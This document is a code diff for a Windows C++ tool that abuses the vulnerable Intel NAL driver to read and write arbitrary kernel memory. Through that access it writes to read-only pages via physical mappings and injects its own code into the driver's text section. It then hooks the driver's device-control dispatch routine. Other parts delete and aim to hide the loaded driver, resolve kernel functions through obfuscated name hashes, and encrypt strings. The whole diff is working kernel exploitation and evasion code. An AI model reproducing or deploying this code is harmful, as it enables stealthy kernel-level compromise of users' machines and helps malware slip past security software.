@@ -635,7 +635,6 @@ typedef struct _NAL_LINUX_RUN_DOMAIN_FUNC
 
 typedef union _NAL_IOCTL_FUNCTION_DATA
 {
-
     NAL_READPORT_FUNCS NalReadPortFuncs;
     NAL_WRITEPORT_FUNCS NalWritePortFuncs;
     NAL_READREGISTER_FUNCS NalReadRegisterFuncs;
@@ -719,7 +718,7 @@ typedef union _NAL_IOCTL_FUNCTION_DATA
 
 typedef union _NAL_IOCTL_RETURN_DATA
 {
-    UINT8 Uint8;
+    UINT8  Uint8;
     UINT16 Uint16;
     UINT32 Uint32;
     UINT64 Uint64;
@@ -729,9 +728,9 @@ typedef union _NAL_IOCTL_RETURN_DATA
 
 typedef struct _NAL_IOCTL_INPUT_DATA
 {
-    UINT64 FunctionId;
-    UINT32 Size;
-   alignas(sizeof(KPTR)) NAL_IOCTL_FUNCTION_DATA InputBuffer;
+   UINT64 FunctionId;
+   UINT32 Size;
+   alignas(sizeof(KPTR)) NAL_IOCTL_FUNCTION_DATA InputBuffer;  
 } NAL_IOCTL_INPUT_DATA;
 
 
@@ -919,7 +918,7 @@ int ExtendNalDrvFunct(void)
  ULONG  OffsIoCtrlDispatchAddr = 0;
  if(this->IsKernelX64())
   {   
-   if(this->ReadMemory(this->pNalDrvObj, &DrvObj64, sizeof(DrvObj64)))
+   if(!this->ReadMemory(this->pNalDrvObj, &DrvObj64, sizeof(DrvObj64)))
     {
      this->NalDrvBase   = DrvObj64.DriverStart;
      this->NalDrvSize   = DrvObj64.DriverSize;
@@ -929,7 +928,7 @@ int ExtendNalDrvFunct(void)
   }
    else
     {     
-     if(this->ReadMemory(this->pNalDrvObj, &DrvObj32, sizeof(DrvObj32)))
+     if(!this->ReadMemory(this->pNalDrvObj, &DrvObj32, sizeof(DrvObj32)))
       {
        this->NalDrvBase   = DrvObj32.DriverStart;
        this->NalDrvSize   = DrvObj32.DriverSize;
@@ -940,7 +939,7 @@ int ExtendNalDrvFunct(void)
 
  DBGMSG("IrpMjDevControlDispatchProc=%lp, NalDrvBase=%lp, NalDrvSize=%08X", OrigMjCtrlProcAddr, this->NalDrvBase, (UINT32)this->NalDrvSize);           
  if(!OrigMjCtrlProcAddr || !this->NalDrvBase || !this->NalDrvSize){LOGMSG("Failed to read DRIVER_OBJECT !"); return -2;}
- if(!this->ReadMemory(this->NalDrvBase, &TmpBuf, sizeof(TmpBuf))){LOGMSG("Failed to read driver`s PE header!"); return -3;}
+ if(this->ReadMemory(this->NalDrvBase, &TmpBuf, sizeof(TmpBuf))){LOGMSG("Failed to read driver`s PE header!"); return -3;}
  NPEFMT::SECTION_HEADER* TextSec = nullptr;
  if(!NPEFMT::GetModuleSection(&TmpBuf, ".text", &TextSec)){LOGMSG("Failed to read driver`s 'text' section!"); return -4;}
  NPEFMT::DOS_HEADER  *DosHdr = (NPEFMT::DOS_HEADER*)&TmpBuf;
@@ -954,21 +953,23 @@ int ExtendNalDrvFunct(void)
  ((UINT64*)&TmpBuf)[-1] = OrigMjCtrlProcAddr;     // Will match with a last member of injected class
  if(this->IsKernelX64())
   {
-   UINT CodeLen = ReadExtBlk64(TmpBuf, sizeof(TmpBuf));
+   int CodeLen = ReadExtBlk64(TmpBuf, sizeof(TmpBuf));
    if(!CodeLen){LOGMSG("ExtBlk64 not present!"); return -5;}
+   if(CodeLen < 0){LOGMSG("ExtBlk64 is too big!"); return -6;}
   }
    else
     {
-     UINT CodeLen = ReadExtBlk32(TmpBuf, sizeof(TmpBuf));
+     int CodeLen = ReadExtBlk32(TmpBuf, sizeof(TmpBuf));
      if(!CodeLen){LOGMSG("ExtBlk32 not present!"); return -5;}
+     if(CodeLen < 0){LOGMSG("ExtBlk32 is too big!"); return -6;}
     }
- if(this->WriteToReadOnlyMemoryUnsafe(this->NalDrvBase+ExEntryOffset, &TmpBuf, sizeof(TmpBuf)) < 0){LOGMSG("Failed to write ExtBlk!"); return -6;}   // It is safe here because we are writing to a single page`s remaining space
- if(this->WriteMemory(this->pNalDrvObj+OffsIoCtrlDispatchAddr, &OrigMjCtrlProcAddr, this->KPtrSize)){LOGMSG("Failed to write new IrpMjDevControlDispatchProc address!"); return -7;} 
+ if(int res=this->WriteToReadOnlyMemoryUnsafe(this->NalDrvBase+ExEntryOffset, &TmpBuf, sizeof(TmpBuf));res < 0){LOGMSG("Failed to write ExtBlk: %i!",res); return -7;}   // It is safe here because we are writing to a single page`s remaining space
+ if(NTSTATUS err=this->WriteMemory(this->pNalDrvObj+OffsIoCtrlDispatchAddr, &OrigMjCtrlProcAddr, this->KPtrSize);err){LOGMSG("Failed to write new IrpMjDevControlDispatchProc address: %08X!",err); return -8;} 
  DBGMSG("Done!");
  return 0;
 }
 //===========================================================================
-template<typename T> bool _SetMemory(T Addr, int Val, T Size)
+template<typename T> NTSTATUS _SetMemory(T Addr, int Val, T Size)
 {
  IO_STATUS_BLOCK iost = {};
  SNalDefs<T>::NAL_IOCTL_INPUT_DATA data = {};     
@@ -976,11 +977,13 @@ template<typename T> bool _SetMemory(T Addr, int Val, T Size)
  data.InputBuffer.NalKMemsetFunc.Source = Val;     
  data.InputBuffer.NalKMemsetFunc.Destination = Addr; 
  data.InputBuffer.NalKMemsetFunc.Size = Size;
- this->LastErrorNt = NtDeviceIoControlFile(this->hNalDev, 0, 0, 0, &iost, IOCTL_NAL_OSI, &data, sizeof(data), 0, 0);
- return !this->LastErrorNt;      
+ NTSTATUS res = NtDeviceIoControlFile(this->hNalDev, 0, 0, 0, &iost, IOCTL_NAL_OSI, &data, sizeof(data), 0, 0);
+ if(res)return res;
+ if(iost.Status)return iost.Status;
+ return res;      
 }
 //---------------------------------------------------------------------------
-template<typename T> bool _CopyMemory(T Dst, T Src, T Size)
+template<typename T> NTSTATUS _CopyMemory(T Dst, T Src, T Size)
 {
  IO_STATUS_BLOCK iost = {};
  SNalDefs<T>::NAL_IOCTL_INPUT_DATA data = {};     
@@ -988,46 +991,68 @@ template<typename T> bool _CopyMemory(T Dst, T Src, T Size)
  data.InputBuffer.NalKMemFuncs.Source = Src;     
  data.InputBuffer.NalKMemFuncs.Destination = Dst; 
  data.InputBuffer.NalKMemFuncs.Size = Size;
- this->LastErrorNt = NtDeviceIoControlFile(this->hNalDev, 0, 0, 0, &iost, IOCTL_NAL_OSI, &data, sizeof(data), 0, 0);
- return !this->LastErrorNt;         
+ NTSTATUS res = NtDeviceIoControlFile(this->hNalDev, 0, 0, 0, &iost, IOCTL_NAL_OSI, &data, sizeof(data), 0, 0);
+ if(res)return res;
+ if(iost.Status)return iost.Status;
+ return res;         
 }
 //---------------------------------------------------------------------------
-template<typename T> bool _GetPhysicalAddress(UINT64 Addr, UINT64* PhysAddr)      // For writing ReadOnly memory(global, in case of mappings)
+template<typename T> NTSTATUS _GetPhysicalAddress(UINT64 Addr, UINT64* PhysAddr)      // For writing ReadOnly memory(global, in case of mappings)
 {
-// if(!Addr){this->LastErrorNt = STATUS_INVALID_ADDRESS; return false;}
+// if(!Addr)return STATUS_INVALID_ADDRESS;
  IO_STATUS_BLOCK iost = {};
  SNalDefs<T>::NAL_IOCTL_INPUT_DATA data = {};     
  data.FunctionId = NAL_GETPHYSICALMEMORYADDRESS_FUNCID;     // MmGetPhysicalAddress    
  data.InputBuffer.NalGetPhysicalMemoryAddressFunc.VirtualAddress = Addr; 
- this->LastErrorNt = NtDeviceIoControlFile(this->hNalDev, 0, 0, 0, &iost, IOCTL_NAL_OSI, &data, sizeof(data), 0, 0);
+ NTSTATUS res = NtDeviceIoControlFile(this->hNalDev, 0, 0, 0, &iost, IOCTL_NAL_OSI, &data, sizeof(data), 0, 0);
+ if(res)return res;
+ if(iost.Status)return iost.Status;
  *PhysAddr = data.InputBuffer.NalGetPhysicalMemoryAddressFunc.ReturnValue;
- return !this->LastErrorNt;
+ return res;
 }
 //---------------------------------------------------------------------------
-template<typename T> bool _MapIoSpace(UINT64 PhysAddr, UINT64* VirtAddr, UINT64* Size)   // For writing ReadOnly memory(global, in case of mappings)
+template<typename T> NTSTATUS _MapIoSpace(UINT64 PhysAddr, UINT64* VirtAddr, UINT64* Size)   // For writing ReadOnly memory(global, in case of mappings)
 {
-// if(!PhysAddr || !Size){this->LastErrorNt = STATUS_INVALID_ADDRESS; return false;}
+// if(!PhysAddr || !Size)return STATUS_INVALID_ADDRESS;
  IO_STATUS_BLOCK iost = {};
  SNalDefs<T>::NAL_IOCTL_INPUT_DATA data = {};     
  data.FunctionId = NAL_MMAPADDRESS_FUNCID;        
  data.InputBuffer.NalMemmapFuncs.PhysicalAddress = PhysAddr; 
- data.InputBuffer.NalMemmapFuncs.Length = *Size;
- this->LastErrorNt = NtDeviceIoControlFile(this->hNalDev, 0, 0, 0, &iost, IOCTL_NAL_OSI, &data, sizeof(data), 0, 0);
+ data.InputBuffer.NalMemmapFuncs.Length = *Size;   // Mandatory!
+ NTSTATUS res = NtDeviceIoControlFile(this->hNalDev, 0, 0, 0, &iost, IOCTL_NAL_OSI, &data, sizeof(data), 0, 0);
+ if(res)return res;
+ if(iost.Status)return iost.Status;
+ res = data.InputBuffer.NalMemmapFuncs.ReturnValue;
  *VirtAddr = data.InputBuffer.NalMemmapFuncs.VirtualAddress;
- *Size     = data.InputBuffer.NalMemmapFuncs.Length;
- return !this->LastErrorNt;
+ *Size     = data.InputBuffer.NalMemmapFuncs.Length;    // Useless, MmMapIoSpace does not updates it
+ return res;
 }
 //---------------------------------------------------------------------------
-template<typename T> bool _UnmapIoSpace(UINT64 VirtAddr, UINT64 Size)     // For writing ReadOnly memory(global, in case of mappings)
+template<typename T> NTSTATUS _UnmapIoSpace(UINT64 VirtAddr, UINT64 Size)     // For writing ReadOnly memory(global, in case of mappings)
 {
-// if(!VirtAddr || !Size){this->LastErrorNt = STATUS_INVALID_ADDRESS; return false;}
+// if(!VirtAddr || !Size)return = STATUS_INVALID_ADDRESS;
  IO_STATUS_BLOCK iost = {};
  SNalDefs<T>::NAL_IOCTL_INPUT_DATA data = {};     
  data.FunctionId = NAL_UNMAPADDRESS_FUNCID;        
  data.InputBuffer.NalMemmapFuncs.VirtualAddress = VirtAddr; 
  data.InputBuffer.NalMemmapFuncs.Length = Size;
- this->LastErrorNt = NtDeviceIoControlFile(this->hNalDev, 0, 0, 0, &iost, IOCTL_NAL_OSI, &data, sizeof(data), 0, 0);
- return !this->LastErrorNt;
+ NTSTATUS res = NtDeviceIoControlFile(this->hNalDev, 0, 0, 0, &iost, IOCTL_NAL_OSI, &data, sizeof(data), 0, 0);
+ if(res)return res;
+ if(iost.Status)return iost.Status;
+ res = data.InputBuffer.NalMemmapFuncs.ReturnValue;
+ return res;
+}
+//---------------------------------------------------------------------------
+template<typename T> NTSTATUS _EnableDebugPrint(bool Enable)     // For writing ReadOnly memory(global, in case of mappings)
+{
+ IO_STATUS_BLOCK iost = {};
+ SNalDefs<T>::NAL_IOCTL_INPUT_DATA data = {};     
+ data.FunctionId = NAL_ENABLE_DEBUG_PRINT_FUNCID;        
+ data.InputBuffer.NalEnableDebugPrintFunc.Enable = Enable; 
+ NTSTATUS res = NtDeviceIoControlFile(this->hNalDev, 0, 0, 0, &iost, IOCTL_NAL_OSI, &data, sizeof(data), 0, 0);
+ if(res)return res;
+ if(iost.Status)return iost.Status;
+ return res;
 }
 //===========================================================================
 void CryptString(wchar_t* str)
@@ -1047,30 +1072,41 @@ public:
  UINT64   NalDrvBase;
  UINT64   NalDrvSize;
  HANDLE   hNalDev;
- NTSTATUS LastErrorNt;
- UINT32   LastErrorNal;
+// NTSTATUS LastErrorNt;
+// UINT32   LastErrorNal;
  UINT32   KPtrSize;
+
+
+// Loading/Hiding the driver
  bool     OwnNalDev;
- CDrvLoader drv;
+ CDrvLoader drv;         // TODO: Need to hide the loaded driver
+ PVOID pWow64EnableWow64FsRedirection;
+// PVOID pWow64RevertWow64FsRedirection;
+// PVOID pWow64DisableWow64FsRedirection;
  wchar_t  OwnDrvPath[MAX_PATH];
 
 //---------------------------------------------------------------------------
 CNalDrv(void)
 {
  this->hNalDev = nullptr;
- this->LastErrorNt = this->LastErrorNal = this->pNalDevObj = this->pNalDevObj = this->pNalDrvObj = this->NalDrvBase = this->NalDrvSize = 0;
+// this->LastErrorNt = this->LastErrorNal = 
+ this->pNalDevObj = this->pNalDevObj = this->pNalDrvObj = this->NalDrvBase = this->NalDrvSize = 0;
  this->KPtrSize = ((sizeof(void*) > 4) || NNTDLL::IsWow64()) ? 8 : 4;
+ this->pWow64EnableWow64FsRedirection   = GetProcAddress(GetModuleHandle("Kernel32.dll"),"Wow64EnableWow64FsRedirection");      // NOTE: May be missing   // For which version?
+// this->pWow64RevertWow64FsRedirection   = GetProcAddress(GetModuleHandle("Kernel32.dll"),"Wow64RevertWow64FsRedirection");    // NOTE: May be missing
+// this->pWow64DisableWow64FsRedirection  = GetProcAddress(GetModuleHandle("Kernel32.dll"),"Wow64DisableWow64FsRedirection");
+ memset(this->OwnDrvPath,0,sizeof(this->OwnDrvPath));  
 }
 //---------------------------------------------------------------------------
 ~CNalDrv()
 {
- if(this->hNalDev && OwnNalDev)
+ if(this->hNalDev && OwnNalDev)     // Is it possible to remove the driver file right after loading?  // Loading from memory by OS API is impossible // Loading from some hidden FS places perhaps?
   {
    NtClose(this->hNalDev);
    this->CryptString(this->OwnDrvPath);   // Decrypt
-   Wow64EnableWow64FsRedirection(FALSE);  // In case the driver has been saved to 'system32\drivers\' directory
+   if(pWow64EnableWow64FsRedirection)((BOOL (WINAPI *)(BOOL))pWow64EnableWow64FsRedirection)(FALSE);  // In case the driver has been saved to 'system32\drivers\' directory
    NTSTATUS stat = NNTDLL::NativeDeleteFile(this->OwnDrvPath);
-   Wow64EnableWow64FsRedirection(TRUE);
+   if(pWow64EnableWow64FsRedirection)((BOOL (WINAPI *)(BOOL))pWow64EnableWow64FsRedirection)(TRUE);
    if(stat){LOGMSG("Failed to delete the driver file(%08X): %ls", stat, &this->OwnDrvPath);}     // It is OK if it not found
     else {DBGMSG("Removed the driver file: %ls",&this->OwnDrvPath);}
    this->CryptString(this->OwnDrvPath);   // Encrypt again
@@ -1084,11 +1120,12 @@ int Initialize(HANDLE hExistingNalDev=nullptr)
  this->OwnNalDev = !hExistingNalDev;
  if(this->OwnNalDev)
   {
-   if(this->LoadNalDriverFromBinBlk() < 0)return -1;
-   if(NNTDLL::OpenDevice(L"Nal", &this->hNalDev) || !this->hNalDev){LOGMSG("Failed to open NAL device: %08X", this->hNalDev); return -1;}
-   if(this->HideNalDriverPresence() < 0){LOGMSG("Failed to hide the driver`s presence!");}
+   if(this->LoadNalDriverFromBinBlk() < 0)return -1;      // TODO: Not implemented!
+   if(NNTDLL::OpenDevice(L"Nal", &this->hNalDev) || !this->hNalDev){LOGMSG("Failed to open NAL device: %08X", this->hNalDev); return -2;}
+   if(this->HideNalDriverPresence() < 0){LOGMSG("Failed to hide the driver`s presence!");}          // TODO: Not implemented!
   }
    else {this->hNalDev = hExistingNalDev; DBGMSG("Reused NAL handle: %p", hExistingNalDev);}
+ this->EnableDebugPrint(true); // <<<<<<<<<<<<<<<< Kernel debug print
  if(this->ExtendNalDrvFunct() < 0){LOGMSG("Extended functionality will not be possible!"); return 2;}
  return 0;
 }
@@ -1100,9 +1137,9 @@ int GetDriverObjByFileHandle(HANDLE hFile, UINT64* pDrvObj=nullptr, UINT64* pDev
  UINT64 pFileObject = NNTDLL::GetObjAddrByHandle(this->hNalDev, NtCurrentProcessId()); 
  if(!pFileObject) {LOGMSG("Failed to get address of FILE_OBJECT !"); return -1;} 
  DBGMSG("PFILE_OBJECT: %lp", pFileObject);
- if(!this->CopyMemory((UINT64)&pDeviceObject, pFileObject + NCMN::AlignP2Frwd(sizeof(UINT16)*2, this->KPtrSize), this->KPtrSize)){LOGMSG("Failed to get address of DEVICE_OBJECT !"); return -2;}    // FILE_OBJECT: CSHORT Type; CSHORT Size; PDEVICE_OBJECT DeviceObject; ...
+ if(NTSTATUS err=this->CopyMemory((UINT64)&pDeviceObject, pFileObject + NCMN::AlignP2Frwd(sizeof(UINT16)*2, this->KPtrSize), this->KPtrSize);err){LOGMSG("Failed to get address of DEVICE_OBJECT: %08X!",err); return -2;}    // FILE_OBJECT: CSHORT Type; CSHORT Size; PDEVICE_OBJECT DeviceObject; ...
  DBGMSG("PDEVICE_OBJECT: %lp", pDeviceObject);      
- if(!this->CopyMemory((UINT64)&pDriverObject, pDeviceObject + 8, this->KPtrSize)){LOGMSG("Failed to get address of DRIVER_OBJECT !"); return -3;}  // DEVICE_OBJECT: CSHORT Type; USHORT Size; LONG ReferenceCount; DRIVER_OBJECT *DriverObject; ...     
+ if(NTSTATUS err=this->CopyMemory((UINT64)&pDriverObject, pDeviceObject + 8, this->KPtrSize);err){LOGMSG("Failed to get address of DRIVER_OBJECT: %08X!",err); return -3;}  // DEVICE_OBJECT: CSHORT Type; USHORT Size; LONG ReferenceCount; DRIVER_OBJECT *DriverObject; ...     
  DBGMSG("PDRIVER_OBJECT: %lp", pDriverObject);
  if(pDrvObj)*pDrvObj = pDriverObject;
  if(pDevObj)*pDevObj = pDeviceObject;
@@ -1110,34 +1147,41 @@ int GetDriverObjByFileHandle(HANDLE hFile, UINT64* pDrvObj=nullptr, UINT64* pDev
  return 0;
 }
 //===========================================================================
-bool SetMemory(UINT64 Addr, int Val, UINT64 Size)   
+NTSTATUS SetMemory(UINT64 Addr, int Val, UINT64 Size)   
 {
  return (this->IsKernelX64()) ? this->_SetMemory<UINT64>(Addr, Val, Size) : this->_SetMemory<UINT32>(Addr, Val, Size);
 }
 //---------------------------------------------------------------------------
-bool CopyMemory(UINT64 Dst, UINT64 Src, UINT64 Size)
+NTSTATUS CopyMemory(UINT64 Dst, UINT64 Src, UINT64 Size)
 {
  return (this->IsKernelX64()) ? this->_CopyMemory<UINT64>(Dst, Src, Size) : this->_CopyMemory<UINT32>(Dst, Src, Size);
 }
 //---------------------------------------------------------------------------
-bool GetPhysicalAddress(UINT64 Addr, UINT64* PhysAddr)
+NTSTATUS GetPhysicalAddress(UINT64 Addr, UINT64* PhysAddr)
 {
  return (this->IsKernelX64()) ? this->_GetPhysicalAddress<UINT64>(Addr, PhysAddr) : this->_GetPhysicalAddress<UINT32>(Addr,PhysAddr);
 } 
 //---------------------------------------------------------------------------
-bool MapIoSpace(UINT64 PhysAddr, UINT64* VirtAddr, UINT64* Size)
+NTSTATUS MapIoSpace(UINT64 PhysAddr, UINT64* VirtAddr, UINT64* Size)
 {
  return (this->IsKernelX64()) ? this->_MapIoSpace<UINT64>(PhysAddr, VirtAddr, Size) : this->_MapIoSpace<UINT32>(PhysAddr, VirtAddr, Size);
 }
 //---------------------------------------------------------------------------
-bool UnmapIoSpace(UINT64 VirtAddr, UINT64 Size)
+NTSTATUS UnmapIoSpace(UINT64 VirtAddr, UINT64 Size)
 {
  return (this->IsKernelX64()) ? this->_UnmapIoSpace<UINT64>(VirtAddr, Size) : this->_UnmapIoSpace<UINT32>(VirtAddr, Size);
 }
+//---------------------------------------------------------------------------
+NTSTATUS EnableDebugPrint(bool Enable)
+{
+ return (this->IsKernelX64()) ? this->_EnableDebugPrint<UINT64>(Enable) : this->_EnableDebugPrint<UINT32>(Enable);
+}
 //===========================================================================
 // NOTE: In case of executable image mappings this will affect them GLOBALLY in every process!
-// NOTE: Watch out for cross page boundaries! Nothing guaranties that you always will have more than one sequential physical page for a requested virtual address space range
+// NOTE: Watch out for cross page boundaries! Nothing guaranties that you will always have more than one sequential physical page for a requested virtual address space range
 // TODO: Build PageList by probing each page, map contiguous ranges and write them one by one
+// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapuserphysicalpages
+//
 int WriteToReadOnlyMemoryUnsafe(UINT64 Addr, void* Buffer, UINT64 Size)
 {
  if(!Addr || !Buffer || !Size)return STATUS_INVALID_ADDRESS;
@@ -1145,11 +1189,11 @@ int WriteToReadOnlyMemoryUnsafe(UINT64 Addr, void* Buffer, UINT64 Size)
  UINT64 PhysAddr = 0;
  stat = this->GetPhysicalAddress(Addr, &PhysAddr);
  if(stat){LOGMSG("Failed to translate virtual address %lp with err %08X", Addr, stat); return -1;}
+ UINT64 MapSize     = Size;     // Input param
  UINT64 MapVirtAddr = 0;
- UINT64 MapSize = 0;
  stat = this->MapIoSpace(PhysAddr, &MapVirtAddr, &MapSize);   // Why we expecting to map here more than a single page???
  if(stat){LOGMSG("Failed to map IO space of %lp with err %08X", PhysAddr, stat); return -2;}
- if(!MapVirtAddr || !MapSize){UnmapIoSpace(MapVirtAddr, MapSize); LOGMSG("Mapped addr or size is NULL!"); return -3;}
+ if(!MapVirtAddr || !MapSize){UnmapIoSpace(MapVirtAddr, MapSize); LOGMSG("Mapped addr or size is NULL: Addr=%p, PhysAddr=%p, MapVirtAddr=%p, MapSize=%p!",(PVOID)Addr, (PVOID)PhysAddr, (PVOID)MapVirtAddr, (PVOID)MapSize); return -3;}
  stat = this->CopyMemory(MapVirtAddr, (UINT64)Buffer, Size);
  if(stat){LOGMSG("Failed to copy memory to kernel space with err %08X", stat); return -4;}
  stat = this->UnmapIoSpace(MapVirtAddr, MapSize);
@@ -1157,12 +1201,12 @@ int WriteToReadOnlyMemoryUnsafe(UINT64 Addr, void* Buffer, UINT64 Size)
  return 0;
 }
 //---------------------------------------------------------------------------
-inline bool ReadMemory(UINT64 Addr, void* Buf, SIZE_T Size)
+inline NTSTATUS ReadMemory(UINT64 Addr, void* Buf, SIZE_T Size)
 {
  return this->CopyMemory((UINT64)Buf, Addr, Size);
 }
 //---------------------------------------------------------------------------
-inline bool WriteMemory(UINT64 Addr, void* Buf, SIZE_T Size)
+inline NTSTATUS WriteMemory(UINT64 Addr, void* Buf, SIZE_T Size)
 {
  return this->CopyMemory(Addr, (UINT64)Buf, Size);
 }
@@ -1281,7 +1325,7 @@ struct DEVICE_OBJECT
 // Injected into free space of a driver`s '.text' section  // MUST fit in rest of code page  // Data starts at 'NextPageAddr - sizeof(SKrnlDrvEx)'
 // It extends an original IRP_MJ_CONTROL handler procedure with the one which performs more interesting operations
 // TODO: Use some compact string encryption for logging (An alternative implementation without intentional code bloating)
-// Can be adapdet to be compatible with other vulnerable drivers, not only NAL drivers?
+// Can be adapded to be compatible with other vulnerable drivers, not only NAL drivers?
 
 #ifdef NALBUILDEXTBLK
 #define NALEXTSECNAME ".extend"
@@ -1296,7 +1340,7 @@ struct DEVICE_OBJECT
 #endif
 
 #define EXTPROC __declspec(dllexport)        // Exported to keep unreferenced code
-#pragma code_seg(push, NALEXTSECNAME)           // WARNING: Make sure that here will be no references to other sections!
+#pragma code_seg(push, NALEXTSECNAME)        // WARNING: Make sure that here will be no references to other sections!
 
 struct SKDrvExCtx     // Max size: x64=48; x32=28
 { 
@@ -1310,7 +1354,7 @@ struct SKDrvExCtx     // Max size: x64=48; x32=28
 #endif
 //---------------------------------------------------------------------------
 #pragma optimize( "yt", on )    // NOTE: Return is optimized only with 'Ox' optimization
-EXTPROC static NTSTATUS _stdcall AIrpMjCtrlDispatchEx(DEVICE_OBJECT* DeviceObject, IRP* Irp)   // This os our extended IrpMjDevControlDispatch   // Functions sorted alphabetically. This function name must start with 'A' for it to be first in the section     // Corrupts stack on x32 'stdcall' but next call is NtContinue anyway
+EXTPROC static NTSTATUS _stdcall AIrpMjCtrlDispatchEx(DEVICE_OBJECT* DeviceObject, IRP* Irp)   // This is our extended IrpMjDevControlDispatch   // Functions sorted alphabetically. This function name must start with 'A' for it to be first in the section     // Corrupts stack on x32 'stdcall' but next call is NtContinue anyway
 {
  SKDrvExCtx* Ctx = GetExCtx(); 
  if(!Ctx->NtKrnlBase)
@@ -1389,8 +1433,8 @@ _declspec(noinline) PVOID GetProcAddr(PVOID ModuleBase, char* ProcName)   // Min
 }
 //--------------------------------------------------------------------------- 
 static constexpr UINT32 Crc32Poly = 0xEB31D82E;  // CRC32K
-static constexpr UINT32 ApiXorKey = NCTM::CRC32A<Crc32Poly>(__TIME__ __DATE__);
-template <SIZE_T N> constexpr __forceinline static UINT32 HSTR(const char (&str)[N]){return NCTM::CRC32A<Crc32Poly>(str) ^ ApiXorKey;}
+static constexpr UINT32 ApiXorKey = CRC32A<Crc32Poly>(__TIME__ __DATE__);
+template <SIZE_T N> constexpr __forceinline static UINT32 HSTR(const char (&str)[N]){return CRC32A<Crc32Poly>(str) ^ ApiXorKey;}
 _declspec(noinline) int ResolveProcPtrs(void)
 {
  if(!this->NtKrnlBase)return -1;
@@ -1409,7 +1453,7 @@ _declspec(noinline) int ResolveProcPtrs(void)
    SIZE_T Ordinal = OrdinalTable[ctr];      // Name Ordinal 
    PVOID Addr = &this->NtKrnlBase[AddressTable[Ordinal]];
    LPSTR Name = (LPSTR)&this->NtKrnlBase[nrva];
-   UINT32 NameHash = NCTM::CRC32<Crc32Poly>(Name) ^ ApiXorKey;
+   UINT32 NameHash = CRC32<Crc32Poly>(Name) ^ ApiXorKey;
    if(!this->pDbgPrint     && (NameHash == HSTR("DbgPrint"))){*(PVOID*)&this->pDbgPrint = Addr; continue;}
    if(!this->pNtCreateFile && (NameHash == HSTR("NtCreateFile"))){*(PVOID*)&this->pNtCreateFile = Addr; continue;}
    if(!this->pNtWriteFile  && (NameHash == HSTR("NtWriteFile"))){*(PVOID*)&this->pNtWriteFile = Addr; continue;}
@@ -1426,15 +1470,16 @@ _declspec(noinline) int ResolveProcPtrs(void)
 #define NALBINEXTFILENAME64 "NalExtBinCode64.cpp"
 
 public:
-static int GenerateBinExt(void)
+// Makes the blob that will be injected into NAL driver to extend it
+static int GenerateBinExt(void)       // TODO: Per project?
 {
 #ifdef _AMD64_
- char    BinExtName[] = {"NalBinExt64"};
+ char    BinExtName[] = {"BinExt64"};
  wchar_t DstPath[MAX_PATH] = {_L(__FILE__)};   
  TrimFilePath(DstPath);
  lstrcatW(DstPath, _L(NALBINEXTFILENAME64));   
 #else
- char    BinLdrName[] = {"NalBinExt32"};
+ char    BinLdrName[] = {"BinExt32"};
  wchar_t DstPath[MAX_PATH] = {_L(__FILE__)};   
  TrimFilePath(DstPath);
  lstrcatW(DstPath, _L(NALBINEXTFILENAME32));
@@ -1445,7 +1490,8 @@ static int GenerateBinExt(void)
  NPEFMT::SECTION_HEADER* Sec = NULL;
  PBYTE ModBase = (PBYTE)GetModuleHandleA(NULL);
  if(!NPEFMT::GetModuleSection(ModBase, (char*)(NALEXTSECNAME), &Sec)){DBGMSG("No 'extend' section found!"); return -1;}
- UINT SecLen = (Sec->VirtualSize + 15) & ~0xF;  // It is equal to exact size of code
+ UINT SecLen = (Sec->VirtualSize + 15) & ~0xF;  // It is equal to exact size of the code
+ // TODO: Encryption
  if(BinDataToCArray(DstFile, &ModBase[Sec->SectionRva], SecLen, BinExtName, 0, sizeof(UINT64)) <= 0){LOGMSG("Failed to create BinExt file!"); return -2;}
  DstFile.ToFile(DstPath);
  LOGMSG("Saved BinExt: %ls",&DstPath);
@@ -1455,12 +1501,12 @@ static int GenerateBinExt(void)
 
 #endif
 //$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
-
-static UINT ReadExtBlk32(PBYTE DstBuf, UINT BufSize)
+// Will be injected into our x32 driver to extend its functionality
+static int ReadExtBlk32(PBYTE DstBuf, UINT BufSize)
 {
 #if __has_include(NALBINEXTFILENAME32)   
 #include NALBINEXTFILENAME32       // Embed it right here. It will be reencrypted at compile time
- //if(BufSize > BSizeBinLdr32)BufSize = BSizeBinLdr32;
+ if(BufSize > BSizeBinExt)BufSize = BSizeBinExt;
  //for(int ctr=0,bleft=BufSize;bleft > 0;ctr++,bleft--)DstBuf[ctr] = DecryptByteWithCtr(((PBYTE)&BinLdr32)[ctr],XKeyBinLdr32,bleft); 
  //DBGMSG("Decrypted with %02X",BYTE(XKeyBinLdr32));
  return BufSize;
@@ -1469,11 +1515,13 @@ static UINT ReadExtBlk32(PBYTE DstBuf, UINT BufSize)
 #endif
 }
 //---------------------------------------------------------------------------
-static UINT ReadExtBlk64(PBYTE DstBuf, UINT BufSize)
+// Will be injected into our x32 driver to extend its functionality
+static int ReadExtBlk64(PBYTE DstBuf, UINT BufSize)
 {
 #if __has_include(NALBINEXTFILENAME64) 
 #include NALBINEXTFILENAME64       // Embed it right here. It will be reencrypted at compile time
- //if(BufSize > BSizeBinLdr64)BufSize = BSizeBinLdr64;
+ if(BufSize < BSizeBinExt)return -BSizeBinExt;     // Buffer too small
+ if(BufSize > BSizeBinExt)BufSize = BSizeBinExt;
  //for(int ctr=0,bleft=BufSize;bleft > 0;ctr++,bleft--)DstBuf[ctr] = DecryptByteWithCtr(((PBYTE)&BinLdr64)[ctr],XKeyBinLdr64,bleft); 
  //DBGMSG("Decrypted with %02X",BYTE(XKeyBinLdr64));
  return BufSize;
